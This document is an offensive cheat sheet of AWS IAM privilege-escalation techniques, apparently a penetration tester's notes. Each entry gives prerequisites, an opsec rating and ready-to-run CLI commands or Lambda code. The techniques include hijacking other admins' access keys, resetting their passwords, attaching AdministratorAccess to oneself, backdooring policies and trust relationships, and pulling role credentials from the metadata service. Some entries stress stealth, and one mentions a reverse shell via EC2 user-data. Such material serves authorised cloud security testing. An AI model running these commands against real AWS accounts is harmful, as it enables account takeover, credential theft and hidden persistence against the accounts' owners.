# AWS IAM Privilege Escalation Techniques

> **Pre-req:** `source /opt/venvTools/bin/activate`

## Shadow Admin Permissions (Admin-Equivalent Without AdministratorAccess Policy)

### iam:CreateAccessKey → Hijack Another Admin's Keys [added: 2026-04]
- **Tags:** #AWS #IAM #CreateAccessKey #PrivEsc #ShadowAdmin #KeyHijack #CredentialTheft #Persistence
- **Trigger:** Compromised user has `iam:CreateAccessKey` permission on another user (especially admins)
- **Prereq:** `iam:CreateAccessKey` permission scoped to target admin user
- **Yields:** New access key pair for the target admin user, granting their full permissions
- **Opsec:** Med
- **Context:** Compromised user has `iam:CreateAccessKey` on another admin account
- **Payload/Method:**
  ```bash
  aws iam create-access-key --user-name <target_admin_user>
  # Creates new keypair for target user — persist as that admin
  ```

### iam:CreateLoginProfile → Set Password on Passwordless Admin [added: 2026-04]
- **Tags:** #AWS #IAM #CreateLoginProfile #PrivEsc #ConsoleAccess #PasswordSet #ShadowAdmin
- **Trigger:** Found an IAM user with high privileges but no console login profile configured
- **Prereq:** `iam:CreateLoginProfile` permission on target user + target user has no existing login profile
- **Yields:** Console access as the target user with full browser-based AWS management
- **Opsec:** Med
- **Context:** IAM user exists but has no console password — attacker can set one
- **Payload/Method:**
  ```bash
  aws iam create-login-profile --user-name <target_user> --password 'ComplexP@ss!'
  # Then log in at: https://<account-id>.signin.aws.amazon.com/console
  ```

### iam:UpdateLoginProfile → Reset Any IAM User Password [added: 2026-04]
- **Tags:** #AWS #IAM #UpdateLoginProfile #PrivEsc #PasswordReset #AccountTakeover #ShadowAdmin
- **Trigger:** Need console access to another IAM user's account and have UpdateLoginProfile permission
- **Prereq:** `iam:UpdateLoginProfile` permission on target user
- **Yields:** Console access as the target user (overwrites their existing password)
- **Opsec:** Med
- **Context:** Have `iam:UpdateLoginProfile` — can change another user's console password
- **Payload/Method:**
  ```bash
  aws iam update-login-profile --user-name <target_user> --password 'NewP@ss!'
  ```

### iam:AttachUserPolicy / AttachRolePolicy → Attach AdministratorAccess to Self [added: 2026-04]
- **Tags:** #AWS #IAM #AttachUserPolicy #AttachRolePolicy #PrivEsc #AdminAccess #PolicyAttach #SelfEscalation
- **Trigger:** Compromised principal has iam:AttachUserPolicy or iam:AttachRolePolicy permission
- **Prereq:** `iam:AttachUserPolicy` or `iam:AttachRolePolicy` permission (on self or assumable role)
- **Yields:** Full AdministratorAccess on the AWS account
- **Opsec:** High
- **Context:** Compromised user has attach policy permission
- **Payload/Method:**
  ```bash
  aws iam attach-user-policy --user-name <my_username> \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

  aws iam attach-role-policy --role-name <role_i_can_assume> \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  ```

### iam:PutUserPolicy → Add Inline Admin Policy to Self [added: 2026-04]
- **Tags:** #AWS #IAM #PutUserPolicy #PrivEsc #InlinePolicy #WildcardPolicy #SelfEscalation
- **Trigger:** Compromised user has `iam:PutUserPolicy` permission on their own user
- **Prereq:** `iam:PutUserPolicy` permission scoped to own username or wildcard
- **Yields:** Full wildcard (*:*) admin permissions via inline policy
- **Opsec:** High
- **Context:** Have `iam:PutUserPolicy` permission — add wildcard inline policy
- **Payload/Method:**
  ```bash
  # admin_policy.json: {"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
  aws iam put-user-policy --user-name <my_username> \
    --policy-name pwn_inline \
    --policy-document file://admin_policy.json
  ```

### iam:CreatePolicyVersion + iam:SetDefaultPolicyVersion → Backdoor Existing Policy [added: 2026-04]
- **Tags:** #AWS #IAM #CreatePolicyVersion #SetDefaultPolicyVersion #PrivEsc #PolicyBackdoor #ManagedPolicy
- **Trigger:** Found a customer-managed policy attached to your principal that you can modify
- **Prereq:** `iam:CreatePolicyVersion` (with `--set-as-default`) or both `iam:CreatePolicyVersion` + `iam:SetDefaultPolicyVersion`
- **Yields:** Escalated permissions by modifying existing policy to admin-level without creating new attachments
- **Opsec:** Med
- **Context:** Attacker can modify customer-managed policies — change non-admin policy to admin
- **Payload/Method:**
  ```bash
  aws iam create-policy-version --policy-arn <target_policy_arn> \
    --policy-document file://admin_policy.json --set-as-default

  # Or promote an existing version
  aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
  ```

### iam:AddUserToGroup → Join Admin Group [added: 2026-04]
- **Tags:** #AWS #IAM #AddUserToGroup #PrivEsc #GroupMembership #AdminGroup #SelfEscalation
- **Trigger:** Enumerated IAM groups and found admin group + have AddUserToGroup permission
- **Prereq:** `iam:AddUserToGroup` permission + knowledge of admin group name
- **Yields:** All permissions of the admin group inherited by your user
- **Opsec:** High
- **Context:** Have `iam:AddUserToGroup` — add self to admin group
- **Payload/Method:**
  ```bash
  aws iam add-user-to-group --group-name <admin_group> --user-name <my_username>
  ```

### iam:UpdateAssumeRolePolicy + sts:AssumeRole → Assume Privileged Role [added: 2026-04]
- **Tags:** #AWS #IAM #UpdateAssumeRolePolicy #AssumeRole #STS #PrivEsc #TrustPolicyAbuse #RoleHijack
- **Trigger:** Found a privileged role and have permission to modify its trust policy
- **Prereq:** `iam:UpdateAssumeRolePolicy` on target role + `sts:AssumeRole`
- **Yields:** Ability to assume the privileged role and inherit all its permissions
- **Opsec:** Med
- **Context:** Can modify trust policy of a privileged role — add self to trust relationship
- **Payload/Method:**
  ```bash
  # trust_policy.json: allow your ARN to assume the role
  aws iam update-assume-role-policy --role-name <privileged_role> \
    --policy-document file://trust_policy.json
  aws sts assume-role --role-arn <role_arn> --role-session-name pwn
  ```

### iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction → Privilege via Lambda [added: 2026-04]
- **Tags:** #AWS #IAM #PassRole #Lambda #PrivEsc #CreateFunction #InvokeFunction #ServerlessEscalation
- **Trigger:** Have iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction and a high-priv Lambda execution role exists
- **Prereq:** `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` + an existing IAM role with elevated permissions that Lambda can assume
- **Yields:** AdministratorAccess attached to your user via Lambda executing IAM calls with the elevated role
- **Opsec:** Med
- **Context:** Can pass a role to Lambda and invoke it — use Lambda to attach admin policy
- **Payload/Method:**
  ```python
  # lambda_pwn.py
  import boto3
  def lambda_handler(event, context):
      iam = boto3.client('iam')
      iam.attach_user_policy(
          UserName='my_username',
          PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
      )
      return {'statusCode': 200}
  ```
  ```bash
  aws lambda create-function --function-name pwn_func --runtime python3.9 \
    --role <arn_of_lambda_role> --handler lambda_pwn.lambda_handler \
    --zip-file fileb://lambda_pwn.zip
  aws lambda invoke --function-name pwn_func output.txt
  ```

### lambda:UpdateFunctionCode → Inject Code into Existing Lambda (Inherits Role) [added: 2026-04]
- **Tags:** #AWS #Lambda #UpdateFunctionCode #PrivEsc #CodeInjection #ServerlessBackdoor #RoleAbuse
- **Trigger:** Found an existing Lambda function with an elevated IAM role and have UpdateFunctionCode permission
- **Prereq:** `lambda:UpdateFunctionCode` permission + target Lambda function with high-priv execution role
- **Yields:** Code execution with the Lambda function's IAM role permissions
- **Opsec:** Med
- **Context:** Existing Lambda has elevated role — update its code to escalate
- **Payload/Method:**
  ```bash
  aws lambda update-function-code --function-name <target_function> \
    --zip-file fileb://malicious_lambda.zip
  ```

### iam:PassRole + ec2:RunInstances → Launch EC2 with Admin Role [added: 2026-04]
- **Tags:** #AWS #IAM #PassRole #EC2 #RunInstances #PrivEsc #InstanceProfile #RoleAbuse #AdminRole
- **Trigger:** Have iam:PassRole + ec2:RunInstances and know of a high-privilege instance profile
- **Prereq:** `iam:PassRole` + `ec2:RunInstances` + an existing instance profile with elevated IAM role + SSH key or user-data capability
- **Yields:** EC2 instance with admin-level IAM role accessible via SSH or reverse shell
- **Opsec:** Med
- **Context:** Can pass a high-priv role to EC2 at launch — instance inherits admin perms
- **Payload/Method:**
  ```bash
  # Method 1: Attach SSH key for interactive access
  aws ec2 run-instances --image-id ami-a4dc46db --instance-type t2.micro \
    --iam-instance-profile Name=admin-role-ip \
    --key-name my_ssh_key --security-group-ids sg-xxxxxxxx

  # Method 2: Reverse shell via user-data
  aws ec2 run-instances --image-id ami-a4dc46db --instance-type t2.micro \
    --iam-instance-profile Name=admin-role-ip \
    --user-data file://reverse_shell.sh
  ```

### iam:PassRole + ec2:AssociateIamInstanceProfile → Attach Admin Role to Existing EC2 [added: 2026-04]
- **Tags:** #AWS #IAM #PassRole #EC2 #AssociateIamInstanceProfile #PrivEsc #InstanceProfile #RoleSwap
- **Trigger:** Have access to an EC2 instance (SSRF/RCE) and can associate instance profiles via IAM
- **Prereq:** `iam:PassRole` + `ec2:AssociateIamInstanceProfile` + existing EC2 instance you can reach + admin instance profile
- **Yields:** Admin-level credentials available via the instance metadata service on the target EC2
- **Opsec:** Med
- **Context:** Have access to an EC2 instance and can associate instance profiles
- **Payload/Method:**
  ```bash
  aws ec2 associate-iam-instance-profile \
    --iam-instance-profile Name=admin-role \
    --instance-id <instance-id>
  # Then use SSRF/RCE to pull creds from metadata
  ```

### glue:UpdateDevEndpoint → SSH Key Injection on Glue Role [added: 2026-04]
- **Tags:** #AWS #Glue #UpdateDevEndpoint #PrivEsc #SSHKeyInjection #ServiceRoleAbuse #DataPipeline
- **Trigger:** Found a Glue dev endpoint with an attached service role and have UpdateDevEndpoint permission
- **Prereq:** `glue:UpdateDevEndpoint` permission + target Glue dev endpoint with elevated service role
- **Yields:** SSH access to Glue dev endpoint with the attached service role's permissions
- **Opsec:** Low
- **Context:** Can update Glue dev endpoint — inherits attached service role
- **Payload/Method:**
  ```bash
  aws glue update-dev-endpoint --endpoint-name <target_endpoint> \
    --public-key file://~/.ssh/id_rsa.pub
  ```

## IAM Enumeration Commands

```bash
# Identity check
aws sts get-caller-identity

# Users & groups
aws iam list-users
aws iam list-groups-for-user --user-name <user>
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>  # inline policies

# Groups
aws iam list-groups
aws iam list-attached-group-policies --group-name <group>

# Roles
aws iam list-roles
aws iam list-attached-role-policies --role-name <role>
aws iam get-role --role-name <role>  # check trust relationships

# Policies
aws iam list-policies
aws iam get-policy --policy-arn <arn>
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <vid>

# Assume role
aws sts assume-role --role-arn <arn> --role-session-name session
export AWS_ACCESS_KEY_ID=<from output>
export AWS_SECRET_ACCESS_KEY=<from output>
export AWS_SESSION_TOKEN=<from output>
```

## Tools

```bash
# enumerate-iam: brute-force all API calls to find granted permissions
git clone https://github.com/andresriancho/enumerate-iam.git
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...

# PMapper: graph IAM and find privesc paths
pmapper graph --create
pmapper query "preset privesc user/PowerUser"
pmapper query "preset privesc *"  # all principals that can escalate

# SkyArk: find shadow admins
Import-Module .\SkyArk.ps1 -force
Start-AWStealth
Scan-AWShadowAdmins

# cloudsplaining: IAM least-privilege violations
cloudsplaining download --profile myprofile
cloudsplaining scan --input-file default.json
```

## AWS API Calls That Return Credentials (Monitor/Exploit)
```
iam:createaccesskey          iam:createloginprofile
sts:assumerole               sts:assumerolewithsaml
sts:assumerolewithwebidentity sts:getfederationtoken
cognito-identity:getcredentialsforidentity
ecr:getauthorizationtoken    sso:getrolecredentials
redshift:getclustercredentials
```

### iam:AttachGroupPolicy — Escalate via Group Policy Attachment [added: 2026-04]
- **Tags:** #AWS #IAM #AttachGroupPolicy #PrivEsc #GroupAbuse #PolicyAttach #SelfEscalation
- **Trigger:** Compromised user has `iam:AttachGroupPolicy` on a group they belong to
- **Prereq:** `iam:AttachGroupPolicy` permission on target group + membership in that group
- **Yields:** All group members inherit AdministratorAccess (affects whole group — broader blast radius than user-scoped attach)
- **Opsec:** Med — group policy attachment logged; visible in IAM console and affects multiple principals
- **Context:** Useful when you can't attach policies directly to your user but control a group you're in
- **Payload/Method:**
```bash
aws iam attach-group-policy --group-name <GROUP> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### iam:PutGroupPolicy — Inject Inline Admin Policy into Group [added: 2026-04]
- **Tags:** #AWS #IAM #PutGroupPolicy #PrivEsc #InlinePolicy #GroupAbuse #SelfEscalation
- **Trigger:** Compromised user has `iam:PutGroupPolicy` on a group they belong to
- **Prereq:** `iam:PutGroupPolicy` permission on target group + membership in that group
- **Yields:** Wildcard admin permissions for all group members via inline policy
- **Opsec:** Med — inline policies harder to inventory than managed; still logged via CloudTrail
- **Context:** Inline policies are less visible in policy audits than managed policies; stealthier than AttachGroupPolicy
- **Payload/Method:**
```bash
aws iam put-group-policy --group-name <GROUP> --policy-name backdoor_inline \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

### iam:PutRolePolicy — Inject Inline Policy into Assumable Role [added: 2026-04]
- **Tags:** #AWS #IAM #PutRolePolicy #PrivEsc #InlinePolicy #RoleAbuse #AssumeRole
- **Trigger:** Compromised user can assume a role AND has `iam:PutRolePolicy` on it
- **Prereq:** `iam:PutRolePolicy` on assumable role + `sts:AssumeRole` on that role
- **Yields:** Elevated permissions within assumed role session; inline policy grants wildcard admin
- **Opsec:** Med — role modification within assumed session; inline policies harder to detect at scale
- **Context:** Assume the role first, then inject inline policy to elevate within that session context
- **Payload/Method:**
```bash
aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT>:role/<ROLE> --role-session-name privesc
# export credentials, then:
aws iam put-role-policy --role-name <ROLE> --policy-name backdoor_inline \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

### iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping — Passive Lambda Trigger via DynamoDB [added: 2026-04]
- **Tags:** #AWS #Lambda #DynamoDB #PassRole #PrivEsc #EventSourceMapping #ServerlessEscalation #PassiveExec
- **Trigger:** Have PassRole + Lambda create permissions + DynamoDB stream exists; need hands-off execution
- **Prereq:** `iam:PassRole` + `lambda:CreateFunction` + `lambda:CreateEventSourceMapping` + DynamoDB table with streams enabled + privileged Lambda execution role
- **Yields:** Privilege escalation triggered passively when any record is inserted into DynamoDB table
- **Opsec:** Low — no direct invocation; execution triggered by normal DynamoDB writes; harder to attribute
- **Context:** More stealthy than direct lambda:InvokeFunction — escalation fires when table is written to; useful in environments with CloudTrail on invoke but not on DynamoDB puts
- **Payload/Method:**
```bash
# Create Lambda with privesc payload
aws lambda create-function --function-name privesc16 --runtime python3.9 \
  --role arn:aws:iam::<ACCOUNT>:role/<PRIV_ROLE> --handler code.lambda_handler \
  --zip-file fileb://function.zip

# Attach to DynamoDB stream
aws lambda create-event-source-mapping --function-name privesc16 \
  --event-source-arn arn:aws:dynamodb:<REGION>:<ACCOUNT>:table/<TABLE>/stream/<STREAM_ID> \
  --starting-position LATEST --enabled

# Trigger by inserting a record
aws dynamodb put-item --table-name <TABLE> --item '{"id":{"S":"trigger"}}'
```

### iam:PassRole + glue:CreateDevEndpoint — New Glue Endpoint with Privileged Role [added: 2026-04]
- **Tags:** #AWS #Glue #CreateDevEndpoint #PassRole #PrivEsc #SSHKeyInjection #ServiceRoleAbuse #MetadataService
- **Trigger:** Have iam:PassRole + glue:CreateDevEndpoint and a high-privilege role exists
- **Prereq:** `iam:PassRole` + `glue:CreateDevEndpoint` + SSH key pair + privileged IAM role + network access to Glue endpoint
- **Yields:** SSH shell on Glue dev endpoint with privileged role credentials via IMDS
- **Opsec:** Low — endpoint creation logged but SSH metadata access is minimal trace
- **Context:** Useful when Lambda/EC2 paths are blocked; Glue endpoints often overlooked in IAM reviews
- **Payload/Method:**
```bash
aws glue create-dev-endpoint --endpoint-name privesc \
  --role-arn arn:aws:iam::<ACCOUNT>:role/<PRIV_ROLE> \
  --public-key file://~/.ssh/id_rsa.pub

# Wait for READY status, get public address
aws glue get-dev-endpoint --endpoint-name privesc

# SSH in and pull creds
ssh [email protected] -i ~/.ssh/id_rsa
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<PRIV_ROLE>
```

### iam:PassRole + cloudformation:CreateStack — Admin User via Stack Deployment [added: 2026-04]
- **Tags:** #AWS #CloudFormation #PassRole #PrivEsc #IaC #StackDeployment #AdminUser #CredentialsInOutput
- **Trigger:** Have PassRole + cloudformation:CreateStack and know of a privileged role to pass
- **Prereq:** `iam:PassRole` + `cloudformation:CreateStack` + `cloudformation:DescribeStacks` + privileged CFN execution role + S3-hosted template (or inline)
- **Yields:** New admin IAM user created by stack; credentials returned in stack outputs
- **Opsec:** Med — stack creation and IAM resource provisioning fully logged; credentials in DescribeStacks output
- **Context:** CloudFormation CAPABILITY_IAM allows stacks to create IAM resources; execution role does the heavy lifting even if your user lacks iam:CreateUser directly
- **Payload/Method:**
```bash
# Template creates admin user with access key, exposes in stack output
aws cloudformation create-stack --stack-name privesc \
  --template-url https://<BUCKET>.s3.amazonaws.com/admin_user_template.json \
  --role-arn arn:aws:iam::<ACCOUNT>:role/<PRIV_ROLE> \
  --capabilities CAPABILITY_IAM

# Wait for CREATE_COMPLETE, then retrieve creds
aws cloudformation describe-stacks --stack-name privesc \
  --query 'Stacks[0].Outputs'
```

### iam:PassRole + datapipeline:CreatePipeline + PutPipelineDefinition + ActivatePipeline — Shell Command via Data Pipeline [added: 2026-04]
- **Tags:** #AWS #DataPipeline #PassRole #PrivEsc #ShellCommand #EC2Execution #DelayedExec #IAMGroupAbuse
- **Trigger:** Have PassRole + datapipeline permissions and a privileged pipeline role; EC2 execution required
- **Prereq:** `iam:PassRole` + `datapipeline:CreatePipeline` + `datapipeline:PutPipelineDefinition` + `datapipeline:ActivatePipeline` + role with EC2 launch + IAM permissions
- **Yields:** Arbitrary shell command execution via EC2 launched by pipeline; can add attacker to admin group
- **Opsec:** High — pipeline activation, EC2 launch, and IAM modification all generate CloudTrail events; delayed execution window
- **Context:** Rarely locked down in IAM policies; useful when Lambda/Glue creation is restricted but DataPipeline permissions exist
- **Payload/Method:**
```bash
aws datapipeline create-pipeline --name privesc --unique-id privesc_$(date +%s)

# Define pipeline with ShellCommandActivity
aws datapipeline put-pipeline-definition \
  --pipeline-id <PIPELINE_ID> \
  --pipeline-definition file://privesc_pipeline.json
# pipeline JSON includes: "command": "aws iam add-user-to-group --group-name Admin --user-name <USER>"

aws datapipeline activate-pipeline --pipeline-id <PIPELINE_ID>
```

### iam:CreateUser + iam:AttachUserPolicy + iam:CreateAccessKey (Prefix-Scoped User Creation) [added: 2026-05]
- **Tags:** #AWS #IAM #PrivEsc #CreateUser #AttachUserPolicy #AccessKey #PrefixScope #PersistentAccess
- **Trigger:** Assumed role has `iam:CreateUser` + `iam:AttachUserPolicy` + `iam:CreateAccessKey` scoped to a username prefix (e.g., `arn:aws:iam::ACCT:user/terraform-dc33-*`); `iam:AttachUserPolicy` is constrained to a specific policy ARN via `ArnEquals` condition
- **Prereq:** IAM role with prefix-scoped CreateUser + AttachUserPolicy (constrained to a target policy ARN) + CreateAccessKey; attacker controls username under the allowed prefix
- **Yields:** New IAM user with target policy permissions + persistent access keys; even if policy is read-only (e.g., S3 access), this creates persistent credentials
- **Opsec:** Med — `CreateUser`, `AttachUserPolicy`, and `CreateAccessKey` all generate CloudTrail events; user creation is visible in IAM console
- **Context:** Even when `iam:CreateUser` is restricted to a prefix and `iam:AttachUserPolicy` is restricted to a single policy ARN, this triad is a complete priv esc if the target policy grants any useful access. The attacker creates a user they control, attaches the policy, then issues access keys for persistent use. Most common in IaC-deployed roles (Terraform, CDK) designed for limited automation.
- **Payload/Method:**
```bash
# Step 1: Create user under allowed prefix
aws iam create-user --user-name terraform-dc33-attacker

# Step 2: Attach the restricted policy (ArnEquals condition satisfied by using exact policy ARN)
aws iam attach-user-policy \
  --user-name terraform-dc33-attacker \
  --policy-arn arn:aws:iam::ACCT_ID:policy/S3BucketAccessPolicy

# Step 3: Create access keys for the new user
aws iam create-access-key --user-name terraform-dc33-attacker

# Step 4: Use the new keys for target access
AWS_ACCESS_KEY_ID=<new_id> AWS_SECRET_ACCESS_KEY=<new_secret> \
  aws s3 cp s3://target-bucket/flag.txt -
```
